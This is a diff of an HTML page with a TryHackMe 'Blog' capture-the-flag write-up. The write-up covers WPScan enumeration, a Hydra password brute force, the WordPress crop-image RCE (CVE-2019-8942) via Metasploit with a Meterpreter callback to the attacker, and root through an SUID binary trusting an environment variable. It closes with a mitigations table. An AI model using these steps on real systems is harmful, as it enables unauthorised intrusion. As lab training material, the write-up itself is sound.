@@ -21,21 +21,21 @@
     <a class="back" href="./">&larr; All writeups</a>
     <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
   </div>
-  <p class="eyebrow">TryHackMe writeup</p>
-  <h1>Blog</h1>
-  <div class="meta">
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Blog</h1>
+  <div class="meta" data-reveal>
     <span class="plat">TryHackMe</span>
     <span class="diff">Medium</span>
     <span>June 17, 2026</span>
   </div>
-  <div class="tldr"><b>TL;DR</b>WPScan fingered WordPress 5.0 and enumerated two users. Hydra cracked <code>kwheel:cutiepie1</code>. The WordPress 5.0 crop-image RCE (CVE-2019-8942) via Metasploit landed a <code>www-data</code> shell. SUID enumeration found <code>/usr/sbin/checker</code> — <code>ltrace</code> revealed it checks for an <code>admin</code> environment variable and calls <code>/bin/bash</code> as root if found. <code>admin=1 /usr/sbin/checker</code> popped root. The real user flag was hiding on a mounted USB at <code>/media/usb/</code> — not in bjoel's home directory where the obvious (troll) <code>user.txt</code> sat. </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>WPScan fingered WordPress 5.0 and enumerated two users. Hydra cracked <code>kwheel:cutiepie1</code>. The WordPress 5.0 crop-image RCE (CVE-2019-8942) via Metasploit landed a <code>www-data</code> shell. SUID enumeration found <code>/usr/sbin/checker</code> — <code>ltrace</code> revealed it checks for an <code>admin</code> environment variable and calls <code>/bin/bash</code> as root if found. <code>admin=1 /usr/sbin/checker</code> popped root. The real user flag was hiding on a mounted USB at <code>/media/usb/</code> — not in bjoel's home directory where the obvious (troll) <code>user.txt</code> sat. </div>
   <div class="tools"><span class="chip">🔎 WPScan</span><span class="chip">🐉 Hydra</span><span class="chip">🐉 Metasploit (<code>exploit/multi/http/wp_crop_rce</code>)</span><span class="chip">🔬 ltrace</span><span class="chip">🔑 Environment variable injection</span></div>
-  <h2>Introduction</h2>
+  <h2 data-reveal>Introduction</h2>
 <p>Today's target is <strong>Blog</strong> — a WordPress site run by Billy Joel and Karen Wheeler, neither of whom appear to have consulted a security professional at any point. WordPress 5.0 was already notorious for the crop-image RCE when this box was built. The box throws in a troll <code>user.txt</code> file in bjoel's home that tells you to "TRY HARDER," a custom SUID binary that checks environment variables with all the sophistication of a bouncer looking for a magic word, and the actual user flag on a USB drive that nobody mounted properly. It's theatrical but effective — the kind of box that teaches you not to trust the obvious path.</p>
 <h3>Prerequisites</h3>
 <p>Readers are assumed to know:</p>
 <ul><li>What WPScan does and how it enumerates WordPress users and vulnerabilities</li><li>What CVE-2019-8942 (WordPress crop-image RCE) involves at a high level</li><li>What <code>ltrace</code> does and how it reveals library calls made by a binary</li><li>How environment variables work in Linux and how to set them for a single command</li></ul>
-<h2>Recon</h2>
+<h2 data-reveal>Recon</h2>
 <p class="aside">(~0 mins into the box)</p>
 <h3>Virtual Host Setup</h3>
 <p>The box requires a hostname to resolve correctly:</p>
@@ -66,7 +66,7 @@
 <p>Password: <code>cutiepie1</code>. Confirmed working on the WordPress login page.</p>
 <h3>Credentials Found</h3>
 <table><thead><tr><th>Username</th><th>Password</th><th>Where Found</th></tr></thead><tbody><tr><td><code>kwheel</code></td><td><code>cutiepie1</code></td><td>Hydra brute force (rockyou.txt)</td></tr></tbody></table>
-<h2>Foothold</h2>
+<h2 data-reveal>Foothold</h2>
 <p class="aside">(~15 mins into the box)</p>
 <h3>CVE-2019-8942 — WordPress Crop-Image RCE</h3>
 <p><strong>What is this vulnerability?</strong> WordPress 5.0 through 5.0.0 contains a post-image cropping feature in the media editor. An authenticated user with at least Author privileges can manipulate the crop parameters to include a path traversal sequence, causing a PHP file to be written to an arbitrary location within the webroot. Combined with CVE-2019-8943 (a directory traversal issue), this becomes a full authenticated remote code execution primitive — no plugin required, just a valid WordPress account.</p>
@@ -86,7 +86,7 @@ msf exploit(multi/http/wp_crop_rce) &gt; run</code></pre>
 [*] Including into theme
 [*] Meterpreter session 1 opened (192.168.134.217:4444 -&gt; 10.48.159.1:32830)</code></pre>
 <p>The first run failed because LHOST was set to the wrong interface (<code>172.26.213.213</code> — a non-routable internal address instead of the VPN tunnel IP). Corrected to <code>192.168.134.217</code> and succeeded immediately.</p>
-<h2>Shell / Access</h2>
+<h2 data-reveal>Shell / Access</h2>
 <p class="aside">(~18 mins into the box)</p>
 <p class="aside">Dropping to a shell from Meterpreter and stabilising:</p>
 <pre><code>meterpreter &gt; shell
@@ -101,7 +101,7 @@ cat /home/bjoel/user.txt
 # You won't find what you're looking for here.
 # TRY HARDER</code></pre>
 <p>A troll. The real user flag is elsewhere — noted and moved on.</p>
-<h2>Escalation</h2>
+<h2 data-reveal>Escalation</h2>
 <p class="aside">(~20 mins into the box)</p>
 <h3>SUID Enumeration — <code>/usr/sbin/checker</code></h3>
 <p class="aside">Finding all SUID binaries:</p>
@@ -140,18 +140,18 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)</code></pre>
 <pre><code>cat /media/usb/user.txt
 # c8421899aae571f7af486492b71a8ab7</code></pre>
 <p>The real user flag was on a mounted USB drive at <code>/media/usb/</code> — only accessible after reaching root (the device requires elevated permissions to read).</p>
-<h2>The Full Chain</h2>
+<h2 data-reveal>The Full Chain</h2>
 <p>The complete attack chain:</p>
 <ol><li><strong>WPScan</strong> → WordPress 5.0 identified, users <code>kwheel</code> and <code>bjoel</code> enumerated</li><li><strong>Hydra</strong> → <code>kwheel:cutiepie1</code> cracked from rockyou.txt</li><li><strong>CVE-2019-8942</strong> (Metasploit <code>wp_crop_rce</code>) → Meterpreter as <code>www-data</code></li><li><strong>SUID <code>/usr/sbin/checker</code></strong> reads <code>admin</code> env variable → <code>setuid(0)</code> → <code>/bin/bash</code></li><li><strong><code>admin=1 /usr/sbin/checker</code></strong> → root shell</li><li><strong><code>/media/usb/user.txt</code></strong> → real user flag (hidden on mounted USB, root-access required)</li></ol>
-<h2>Rabbit Holes</h2>
+<h2 data-reveal>Rabbit Holes</h2>
 <h3>The Troll <code>user.txt</code> in <code>/home/bjoel/</code></h3>
 <p>The most deliberate misdirection in the box. The file exists, is readable by <code>www-data</code>, and contains "You won't find what you're looking for here. TRY HARDER." The real flag is on a USB mount that only becomes visible once root is obtained. Running <code>find / 2&gt;/dev/null | grep user.txt</code> as root reveals both paths — always worth running even after finding a flag file, since boxes occasionally have flags in non-standard locations.</p>
 <h3>Wrong LHOST on First Metasploit Run</h3>
 <p>The first <code>run</code> used the default LHOST which pointed at a non-routable internal address (<code>172.26.213.213</code>). The exploit completed — image uploaded, payload included in theme — but no session arrived because the callback couldn't reach the listener. Correcting LHOST to the VPN tunnel IP (<code>tun0</code> address) resolved it on the second attempt. Always verify LHOST matches the <code>tun0</code> interface, not whatever Metasploit auto-detects.</p>
-<h2>Mitigations</h2>
+<h2 data-reveal>Mitigations</h2>
 <table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>WordPress 5.0 running unpatched (CVE-2019-8942)</td><td class="sev-critical">Critical</td><td>Update WordPress immediately; enable automatic minor-version updates; subscribe to WordPress security advisories</td></tr><tr><td>Weak WordPress password (<code>cutiepie1</code>) in rockyou.txt</td><td class="sev-high">High</td><td>Enforce strong password policy on all WP accounts; enable login attempt limiting (Wordfence, Fail2Ban, or similar)</td></tr><tr><td>XML-RPC enabled without requirement</td><td class="sev-medium">Medium</td><td>Disable XML-RPC if not needed (<code>add_filter('xmlrpc_enabled', '__return_false')</code> or via <code>.htaccess</code>)</td></tr><tr><td>Upload directory listing enabled</td><td>Low</td><td>Add <code>Options -Indexes</code> to the Apache/Nginx config for <code>wp-content/uploads/</code></td></tr><tr><td>Custom SUID binary checking environment variable for auth</td><td class="sev-critical">Critical</td><td>Never use environment variables as an authentication mechanism for a SUID binary; env vars are user-controlled and trivially set</td></tr></tbody></table>
-  <div class="takeaway"><b>Key takeaway</b>Environment variables are entirely user-controlled — any user can set <code>admin=1</code> before running a command. Using them as an authentication gate inside a SUID binary is not security, it's the illusion of security. SUID binaries must validate privileges through the OS (checking real UID, comparing against <code>/etc/sudoers</code>, verifying group membership) — never through data the calling user can freely manipulate.</div>
-  <h2>If I Did It Again</h2>
+  <div class="takeaway" data-reveal><b>Key takeaway</b>Environment variables are entirely user-controlled — any user can set <code>admin=1</code> before running a command. Using them as an authentication gate inside a SUID binary is not security, it's the illusion of security. SUID binaries must validate privileges through the OS (checking real UID, comparing against <code>/etc/sudoers</code>, verifying group membership) — never through data the calling user can freely manipulate.</div>
+  <h2 data-reveal>If I Did It Again</h2>
 <p>Verify <code>tun0</code> LHOST before running any Metasploit module — it's a two-second <code>ip a s tun0</code> check that saves a failed exploit attempt and the time spent re-reading the output wondering why no session arrived.</p>
   <div class="cta-row">
     <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/blog_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
@@ -159,5 +159,30 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)</code></pre>
   </div>
   <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
 </div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
 </body>
 </html>
